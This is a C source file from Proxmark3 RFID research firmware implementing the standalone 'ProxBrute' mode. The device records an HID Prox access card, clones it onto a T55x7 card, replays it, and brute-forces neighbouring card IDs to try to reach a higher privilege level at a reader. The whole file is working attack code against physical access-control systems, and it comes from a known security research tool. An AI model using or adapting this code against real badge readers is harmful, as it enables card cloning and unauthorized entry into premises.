//-----------------------------------------------------------------------------
// Samy Kamkar, 2011, 2012
// Brad antoniewicz 2011
// Christian Herrmann, 2017
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// main code for LF aka Proxbrute by Brad antoniewicz
//-----------------------------------------------------------------------------
#include "lf_proxbrute.h"

// samy's sniff and repeat routine for LF
void RunMod() {
    StandAloneMode();
    Dbprintf(">>  LF HID proxII bruteforce a.k.a ProxBrute Started (Brad Antoniewicz) <<");
    FpgaDownloadAndGo(FPGA_BITSTREAM_LF);

    uint32_t high[OPTS], low[OPTS];
    int selected = 0;
    int playing = 0;
    int cardRead = 0;

    // Turn on selected LED
    LED(selected + 1, 0);

    for (;;) {
        WDT_HIT();

        // exit from SamyRun,   send a usbcommand.
        if (usb_poll_validate_length()) break;

        // Was our button held down or pressed?
        int button_pressed = BUTTON_HELD(1000);
        SpinDelay(300);

        // Button was held for a second, begin recording
        if (button_pressed > 0 && cardRead == 0) {
            LEDsoff();
            LED(selected + 1, 0);
            LED(LED_RED2, 0);

            // record
            DbpString("[=] starting recording");

            // wait for button to be released
            while (BUTTON_PRESS())
                WDT_HIT();

            /* need this delay to prevent catching some weird data */
            SpinDelay(500);

            CmdHIDdemodFSK(1, &high[selected], &low[selected], 0);
            Dbprintf("[=] recorded %x %x %08x", selected, high[selected], low[selected]);

            LEDsoff();
            LED(selected + 1, 0);
            // Finished recording
            // If we were previously playing, set playing off
            // so next button push begins playing what we recorded
            playing = 0;
            cardRead = 1;
        } else if (button_pressed > 0 && cardRead == 1) {
            LEDsoff();
            LED(selected + 1, 0);
            LED(LED_ORANGE, 0);

            // record
            Dbprintf("[=] cloning %x %x %08x", selected, high[selected], low[selected]);

            // wait for button to be released
            while (BUTTON_PRESS())
                WDT_HIT();

            /* need this delay to prevent catching some weird data */
            SpinDelay(500);

            CopyHIDtoT55x7(0, high[selected], low[selected], 0);
            Dbprintf("[=] cloned %x %x %08x", selected, high[selected], low[selected]);

            LEDsoff();
            LED(selected + 1, 0);
            // Finished recording

            // If we were previously playing, set playing off
            // so next button push begins playing what we recorded
            playing = 0;
            cardRead = 0;
        }

        // Change where to record (or begin playing)
        else if (button_pressed) {
            // Next option if we were previously playing
            if (playing)
                selected = (selected + 1) % OPTS;
            playing = !playing;

            LEDsoff();
            LED(selected + 1, 0);

            // Begin transmitting
            if (playing) {
                LED(LED_GREEN, 0);
                DbpString("[=] playing");
                // wait for button to be released
                while (BUTTON_PRESS())
                    WDT_HIT();

                /* START PROXBRUTE */

                /*
                ProxBrute - brad a. - foundstone

                Following code is a trivial brute forcer once you read a valid tag
                the idea is you get a valid tag, then just try and brute force to
                another priv level. The problem is that it has no idea if the code
                worked or not, so its a crap shoot. One option is to time how long
                it takes to get a valid ID then start from scratch every time.
                */
                if (selected == 1) {
                    DbpString("[=] entering ProxBrute Mode");
                    Dbprintf("[=] current Tag: Selected = %x Facility = %08x ID = %08x", selected, high[selected], low[selected]);
                    LED(LED_ORANGE, 0);
                    LED(LED_RED, 0);
                    for (uint16_t i = low[selected] - 1; i > 0; i--) {
                        if (BUTTON_PRESS()) {
                            DbpString("[-] told to stop");
                            break;
                        }

                        Dbprintf("[=] trying Facility = %08x ID %08x", high[selected], i);
                        CmdHIDsimTAGEx(high[selected], i, 0, 20000);
                        SpinDelay(500);
                    }

                } else {
                    DbpString("[=] RED is lit, not entering ProxBrute Mode");
                    Dbprintf("[=] %x %x %x", selected, high[selected], low[selected]);
                    CmdHIDsimTAGEx(high[selected], low[selected], 0, 20000);
                    DbpString("[=] done playing");
                }

                /*   END PROXBRUTE */


                if (BUTTON_HELD(1000) > 0)
                    goto out;

                /* We pressed a button so ignore it here with a delay */
                SpinDelay(300);

                // when done, we're done playing, move to next option
                selected = (selected + 1) % OPTS;
                playing = !playing;
                LEDsoff();
                LED(selected + 1, 0);
            } else {
                while (BUTTON_PRESS())
                    WDT_HIT();
            }
        }
    }
out:
    DbpString("[=] exiting");
    LEDsoff();
}
